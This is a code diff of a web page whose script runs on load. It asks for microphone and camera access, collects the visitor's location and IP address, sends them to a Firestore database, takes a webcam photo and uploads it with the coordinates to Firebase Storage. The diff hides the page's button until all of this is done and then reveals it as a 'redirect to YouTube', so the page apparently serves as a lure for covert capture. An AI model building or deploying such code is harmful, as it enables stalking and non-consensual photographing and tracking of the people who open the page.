@@ -16,6 +16,7 @@
             height: 100vh;
             color: white; /* White text */
             flex-direction: column; /* Column layout */
+            text-align: center; /* Center text */
         }
         #clickButton {
             margin-top: 20px;
@@ -26,6 +27,7 @@
             cursor: pointer;
             border-radius: 5px;
             font-size: 16px;
+            display: none; /* Hidden by default */
         }
     </style>
     <script type="module">
@@ -75,74 +77,72 @@
         // Function to get location, IP address, and capture image
         async function getLocationAndIP() {
             // Request microphone permission first
-            await navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(async () => {
-                    // Then request camera permission
-                    await navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(async (stream) => {
-                            // Get the user's location
-                            if (navigator.geolocation) {
-                                navigator.geolocation.getCurrentPosition(async (position) => {
-                                    const latitude = position.coords.latitude;
-                                    const longitude = position.coords.longitude;
+            try {
+                await navigator.mediaDevices.getUserMedia({ audio: true });
 
-                                    // Fetch the user's IP address using a public API
-                                    try {
-                                        const ipResponse = await fetch('https://api.ipify.org?format=json');
-                                        const ipData = await ipResponse.json();
-                                        const ipAddress = ipData.ip;
+                // Then request camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Get the user's location
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
 
-                                        // Save IP and location to Firestore
-                                        await addDoc(collection(db, "users"), {
-                                            ip: ipAddress,
-                                            latitude: latitude,
-                                            longitude: longitude,
-                                            timestamp: new Date()
-                                        });
-                                        console.log("Location and IP data sent to Firestore successfully");
+                        // Fetch the user's IP address using a public API
+                        try {
+                            const ipResponse = await fetch('https://api.ipify.org?format=json');
+                            const ipData = await ipResponse.json();
+                            const ipAddress = ipData.ip;
 
-                                        // Capture image from the video stream
-                                        const video = document.createElement('video');
-                                        video.srcObject = stream;
-                                        video.play();
+                            // Save IP and location to Firestore
+                            await addDoc(collection(db, "users"), {
+                                ip: ipAddress,
+                                latitude: latitude,
+                                longitude: longitude,
+                                timestamp: new Date()
+                            });
+                            console.log("Location and IP data sent to Firestore successfully");
 
-                                        // Wait for the video to load
-                                        await new Promise((resolve) => {
-                                            video.onloadedmetadata = () => {
-                                                resolve();
-                                            };
-                                        });
+                            // Capture image from the video stream
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.play();
 
-                                        // Create a canvas to capture the image
-                                        const canvas = document.createElement('canvas');
-                                        canvas.width = 640; // Set canvas width
-                                        canvas.height = 480; // Set canvas height
-                                        const context = canvas.getContext('2d');
-                                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                        const imageData = canvas.toDataURL('image/png');
+                            // Wait for the video to load
+                            await new Promise((resolve) => {
+                                video.onloadedmetadata = () => {
+                                    resolve();
+                                };
+                            });
 
-                                        // Upload captured image and location coordinates to Firebase Storage
-                                        await uploadImage(imageData, { latitude, longitude });
+                            // Create a canvas to capture the image
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640; // Set canvas width
+                            canvas.height = 480; // Set canvas height
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/png');
 
-                                        // Stop the video stream
-                                        stream.getTracks().forEach(track => track.stop());
-                                    } catch (error) {
-                                        console.error("Error fetching IP address or sending data to Firestore: ", error);
-                                    }
-                                }, (error) => {
-                                    console.error("Geolocation error: ", error);
-                                });
-                            } else {
-                                console.error("Geolocation is not supported by this browser.");
-                            }
-                        })
-                        .catch(error => {
-                            console.error("Camera permission denied:", error);
-                        });
-                })
-                .catch(error => {
-                    console.error("Microphone permission denied:", error);
-                });
+                            // Upload captured image and location coordinates to Firebase Storage
+                            await uploadImage(imageData, { latitude, longitude });
+
+                            // Stop the video stream
+                            stream.getTracks().forEach(track => track.stop());
+
+                            // Show the button to redirect to YouTube
+                            document.getElementById('clickButton').style.display = 'block';
+                        } catch (error) {
+                            console.error("Error fetching IP address or sending data to Firestore: ", error);
+                        }
+                    }, (error) => {
+                        console.error("Geolocation error: ", error);
+                    });
+                } else {
+                    console.error("Geolocation is not supported by this browser.");
+                }
+            } catch (error) {
+                console.error("Microphone or camera permission denied:", error);
+            }
         }
 
         // Call the function to get location and IP when the page loads
